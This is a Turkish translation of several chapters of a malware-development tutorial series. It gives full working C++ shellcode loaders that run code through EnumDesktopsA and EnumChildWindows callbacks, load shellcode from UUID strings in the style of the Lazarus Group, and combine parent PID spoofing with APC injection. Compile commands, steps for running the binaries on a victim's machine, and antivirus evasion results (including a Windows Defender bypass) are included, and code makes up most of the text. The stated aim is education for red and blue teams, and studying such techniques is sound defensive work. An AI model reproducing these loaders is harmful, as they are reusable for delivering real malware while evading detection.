	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
Demo
Şimdi her şeyi eylemde görelim. Zararlı yazılımımızı derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

Ve kurbanın makinesinde çalıştırıyoruz:
.\hack.exe

++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)

Şimdi `hack.exe` dosyamızı VirusTotal'a yükleyelim:

++++++++++++++++++++++++++++++++

Sonuç olarak, 66 antivirüs motorundan 16 tanesi dosyamızı zararlı olarak algıladı.
https://www.virustotal.com/gui/file/657ff9b6499f8eed373ac61bf8fc98257295869a
833155f68b4d68bb6e565ca1/detection

Ve ilginç olan şu ki, bu numara Windows Defender'ı atlattı. 
++++++++++++++++++++++++++++++++

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

EnumDesktopsA(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumdesktopsa)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-06-27-malware-injection-20

34. Zararlı Yazılım Geliştirme Tüyoları. EnumChildWindows Kullanarak Shellcode Çalıştırma. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++

Bu bölüm, alt pencereleri listeleyerek shellcode çalıştırmak üzerine yaptığım araştırmaların bir sonucudur.

EnumChildWindows
Alt pencerelerin tanıtıcısını, uygulama tarafından oluşturulan bir geri çağırma işlevine sağlayarak, belirtilen ana pencerenin alt pencerelerini listeler.  
EnumChildWindows, ya son alt pencere listelenene ya da geri çağırma işlevi FALSE döndürene kadar devam eder:  
BOOL EnumChildWindows(
HWND hWndParent,
WNDENUMPROC lpEnumFunc,
LPARAM lParam
);

Pratik Örnek  
Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve önceki numaralara benzer:  
/*
* hack.cpp - run shellcode via EnumChildWindows.
C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/malware/
2022/07/13/malware-injection-21.html
*/
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {

	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
	return 0;
}

İlk olarak, VirtualAlloc kullanarak mevcut işlemde bir bellek tamponu ayırıyoruz:  

LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Daha sonra payload'umuzu bu bellek bölgesine 'kopyalıyoruz':

RtlMoveMemory(mem, my_payload, sizeof(my_payload));

Daha sonra, EnumChildWindows işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:  

EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

Her zamanki gibi, basitlik adına meow-meow mesaj kutusu payload'unu kullandım:  

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

Demo

Her şeyi eylemde görelim. Zararlı yazılımımızı derleyelim:  

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

Ve kurbanın makinesinde çalıştırıyoruz:  

.\hack.exe
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim: 
 
++++++++++++++++++++++++++++++++

Sonuç olarak, 69 antivirüs motorundan 20 tanesi dosyamızı zararlı olarak algıladı.  

https://www.virustotal.com/gui/file/71c4294f90d6d6c3686601b519c2401a58bb1fb0
3ab9ca3975eca7231af77853/detection

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.  

EnumChildWindows(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumchildwindows)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-07-13-malware-injection-21

35. Zararlı Yazılım Geliştirme Tüyoları. Lazarus Group Tarzı Shellcode Çalıştırma. C++ Örneği.

﷽

++++++++++++++++++++++++++++++++

Bu yazı, başka bir ilginç numara üzerine yaptığım araştırmaların bir sonucudur: UuidFromStringA ve EnumChildWindows kullanarak payload çalıştırma.

UuidFromStringA 

Bu işlev, bir dizeyi UUID'ye dönüştürür:  
RPC_STATUS UuidFromStringA(
RPC_CSTR StringUuid,
UUID *Uuid
);

Standard memcpy veya WriteProcessMemory işlevlerini kullanmadan, bu işlev verileri çözmek ve belleğe yazmak için kullanılabilir.  

Shellcode çalıştırma tekniği şu adımlardan oluşur:  
	- Bellek tahsisi (VirtualAlloc)  
	- UuidFromStringA kullanarak UUID dizilerini ikili formata dönüştürüp belleğe kaydetme  
	- EnumChildWindows (veya EnumDesktopsA ya da başka bir aday) kullanarak belleğe yüklenen payload'u yürütme  

Pratik Örnek

Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve önceki numaralara benzer, ancak Lazarus Group'a özgü bazı değişiklikler içerir.  

İlk olarak, istediğimiz payload'u UUID geçerli dizelere dönüştürmek için bir betiğe ihtiyacımız var. Örneğin payload_uuid.py:  

#!usr/bin/python3

from uuid import UUID
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p','--payload', required = True, help = "payload: binary file")
args = vars(parser.parse_args())
pbin = args['payload']

with open(pbin, "rb") as f:
	# read in 16 bytes from our input payload
	chunk = f.read(16)
	while chunk:
		# if the chunk is less than 16 bytes then we pad the difference (x90)
		if len(chunk) < 16:
			padding = 16 - len(chunk)
			chunk = chunk + (b"\x90" * padding)
		print(UUID(bytes_le=chunk))
	chunk = f.read(16)

Her zamanki gibi, meow-meow mesaj kutusu payload'u (meow.bin) kullanacağım.  

Çalıştır:  

python3 payload_uuid.py -p meow.bin
++++++++++++++++++++++++++++++++

Artık payload'umuzu UUID formatında elde ettiğimize göre, aşağıdaki kodu test etmek için bir kavram kanıtı oluşturabiliriz:  
#include <windows.h>
#include <rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
	"e48148fc-fff0-ffff-e8d0-000000415141",
	"56515250-3148-65d2-488b-52603e488b52",
	"8b483e18-2052-483e-8b72-503e480fb74a",
	"c9314d4a-3148-acc0-3c61-7c022c2041c1",
	"01410dc9-e2c1-52ed-4151-3e488b52203e",
	"483c428b-d001-8b3e-8088-0000004885c0",
	"01486f74-50d0-8b3e-4818-3e448b402049",
	"5ce3d001-ff48-3ec9-418b-34884801d64d",
	"3148c931-acc0-c141-c90d-4101c138e075",
	"034c3ef1-244c-4508-39d1-75d6583e448b",
	"01492440-66d0-413e-8b0c-483e448b401c",
	"3ed00149-8b41-8804-4801-d0415841585e",
	"58415a59-5941-5a41-4883-ec204152ffe0",
	"5a594158-483e-128b-e949-ffffff5d49c7",
	"000000c1-3e00-8d48-95fe-0000003e4c8d",
	"00010985-4800-c931-41ba-45835607ffd5",
	"41c93148-f0ba-a2b5-56ff-d54d656f772d",
	"776f656d-0021-5e3d-2e2e-5e3d00909090"
};

int main() {
	int elems = sizeof(uuids) / sizeof(uuids[0]);
	VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000,
	PAGE_EXECUTE_READWRITE);
	DWORD_PTR hptr = (DWORD_PTR)mem;
	for (int i = 0; i < elems; i++) {
		// printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
		// printf("%s\n", *(uuids+i));
		RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
		if (status != RPC_S_OK) {
			printf("[-] UUID convert error\n");
			CloseHandle(mem);
			return-1;
		}
		hptr += 16;
	}
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

	// EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
	CloseHandle(mem);
	return 0;
}

UuidFromStringA işlevine dikkat edin. Daha önce yazdığım gibi, bu API'yi bir UUID işaretçisi yerine bir bellek işaretçisi ile çağırmak, verilen UUID'nin ikili temsilinin bellekte saklanmasına neden olur.  

Birçok API isteğini zincirleyerek ve uygun şekilde tasarlanmış UUID'ler vererek, gerekli içeriği (payload) seçilen bellek bölgesine yüklemek mümkündür.  

Ve ardından, EnumChildWindows işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:  

EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

veya başka bir işlev EnumDesktopsA:  

EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

Demo

Her şeyi eylemde görmek için zararlı kodumuzu derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4

++++++++++++++++++++++++++++++++

ve kurbanın makinesinde çalıştıralım:

.\hack.exe

++++++++++++++++++++++++++++++++

Payload'umuzun gerçekten çalıştığından emin olmak için kodun bir kısmını biraz değiştirebilirsiniz:  

printf("[*] Hexdump: ");
for (int i = 0; i < elems*16; i++) {
	printf("%02X ", ((unsigned char*)mem)[i]);
}

Daha sonra tekrar derleyin:  

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4

++++++++++++++++++++++++++++++++

Ve tekrar çalıştırın:  

.\hack.exe

++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim:  
++++++++++++++++++++++++++++++++


Sonuç olarak, 68 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.  

Bir sorun var.Lazarus Group, HeapCreate ve HeapAlloc işlevlerini kullanmayı tercih ediyor:

HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
void* mem = HeapAlloc(hc, 0, 0x100000);  

HeapAlloc, yığın belleği tahsis etmek için sık kullanılan bir API çağrısıdır.  
Bu API, bildiğim kadarıyla, VirtualAlloc API'si yerine yığından belirli miktarlarda bellek ayırmanıza olanak tanır. Ancak belgelerine göre, gerekirse HeapAlloc hala VirtualAlloc'u çağırabilir.  

Ayrıca bu API, o kadar şüpheli kabul edilmez.  

Lazarus Group ayrıca payload'u yürütmek için EnumSystemLocalesA işlevini kullanır.  

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerine ilham olur.  

nccgroup - RIFT: Analysing a Lazarus Shellcode Execution Method(https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)
Lazarus Group(https://attack.mitre.org/groups/G0032/)
Github’taki kaynak kod: https://github.com/cocomelonc/meow/tree/master/2022-07-21-malware-tricks-22

36. Zararlı Yazılım Geliştirme Tüyoları. Parent PID Spoofing. Basit C++ Örneği.

﷽

++++++++++++++++++++++++++++++++

Bu makale, parent process ID spoofing üzerine yaptığım kendi araştırmalarımın bir sonucudur.

Parent PID Spoofing  

Parent ve child süreçler arasındaki ilişkileri izlemek, tehdit avı ekipleri tarafından kötü amaçlı etkinlikleri belirlemek için kullanılan yaygın bir yöntemdir. Kırmızı takım üyeleri, Parent PID Spoofing yöntemini bir kaçış yöntemi olarak benimsemiştir.  CreateProcess Windows API çağrısı, Parent PID'yi belirlemenize olanak tanıyan bir parametreyi destekler.  
Bu, kötü amaçlı bir işlemin oluşturulduğunda çalıştırılan işlemden farklı bir parent kullanabileceği anlamına gelir.  

Pratik Örnek

Hadi pratik bir örneğe bakalım. İlk olarak, diyelim ki elimizde bir süreç var, örneğin mspaint.exe:


++++++++++++++++++++++++++++++++

PID'sinin 3396 olduğunu görebilirsiniz. Parent süreci (PID: 2876) explorer.exe'dir:  

 ++++++++++++++++++++++++++++++++

Process Hacker kullanarak, mevcut dizinin C:\Windows\System32 olduğunu da görebiliriz:  

++++++++++++++++++++++++++++++++

Bu numaranın yürütme akışı şu adımları içerir:  
- explorer.exe PID'sini aldım: 

int pid = findMyProc(argv[1]);
if (pid) {
	printf("PID = %d\n", pid);
}

HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid); 

Mspaint.exe sürecini oluşturalım:

CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000,
MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Oluşturulan süreç belleğine meow-meow payload'unu yazın:

BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload, sizeof(my_payload), nb);

Oluşturulan işlemin iş parçacığına, APC kuyruğuna bir kullanıcı modu asenkron işlem çağrısı (APC) nesnesi ekleyin:  

QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);

İş parçacığını devam ettirin:  

ResumeThread(pi.hThread);
CloseHandle(pi.hThread);

Tam kaynak kod:
/*
hack.cpp
parent PID spoofing with APC
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
*/
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int findMyProc(const char *procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T st;
	int pid = findMyProc(argv[1]);
	if (pid) {
		printf("PID = %d\n", pid);
	}

	HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);

	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	InitializeProcThreadAttributeList(NULL, 1, 0, &st);
	si.lpAttributeList =
	(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, st);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &st);
	UpdateProcThreadAttribute(si.lpAttributeList, 0,
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL,
	NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
	LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE |
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	SIZE_T *nb = 0;
	BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload,
	sizeof(my_payload), nb);
	QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	return 0;
}  

Gördüğünüz gibi, önceki gönderilerimden kodu yeniden kullandım.  
Burada, başlatılan süreci biraz sabitledim; bunu komut satırı parametrelerinden alacak şekilde değiştirebilirsiniz.  

Demo

Kodumuzu derleyelim: 

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-mwindows -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

kurbanın makinesinde çalıştıralım:  

.\hack.exe explorer.exe

++++++++++++++++++++++++++++++++

Process Hacker'ı çalıştırın ve görebileceğiniz gibi, mspaint.exe süreci başarıyla oluşturuldu (PID: 4720):  

++++++++++++++++++++++++++++++++

Ve:  
++++++++++++++++++++++++++++++++

++++++++++++++++++++++++++++++++


Gördüğünüz gibi, parent süreç 2876, bu explorer.exe'ye karşılık geliyor, ancak mevcut dizin Z:\2022-09-06-malware-tricks-23!  

Ve süreç belleğinde ne olduğuna bakalım:

++++++++++++++++++++++++++++++++

Her şey mükemmel bir şekilde çalıştı :)  

Aslında sizi biraz kandırdım. Örneğimde sadece parent süreç spoofing yapılmadı. 
Bu, PPID spoofing ve APC enjeksiyonunun bir kombinasyonudur. Çünkü ben de sizin gibi yeni şeyler öğreniyorum ve bazen kendinize sorular sormaktan ve denemekten korkmamalısınız.  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim:

++++++++++++++++++++++++++++++++

Sonuç olarak, 70 antivirüs motorundan 20 tanesi dosyamızı zararlı olarak algıladı.  

https://www.virustotal.com/gui/file/3ec9f1080253f07695f0958ae84e99ff065f052c
409f0f7e3e1a79cd4385a9d5/detection

Bu teknik, Cobalt Strike ve KONNI RAT tarafından kullanılır.  
Örneğin, Cobalt Strike alternatif PPID'lerle süreçler başlatabilir.  

Bu teknik, ilk olarak 2009'da Didier Stevens tarafından daha geniş bilgi güvenliği topluluğuna tanıtıldı.  

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler. 

Didier Stevens: That Is Not My Child Process!( https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/)
MITRE ATT&CK: Parent PID spoofing(https://attack.mitre.org/techniques/T1134/004/)
Cobalt Strike(https://attack.mitre.org/software/S0154/)
KONNI(https://attack.mitre.org/software/S0356/)
CreateProcessA(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
Find process ID by name and inject to it(https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
APC injection technique(https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
Github’taki kaynak kod: https://github.com/cocomelonc/meow/tree/master/2022-09-06-malware-tricks-23
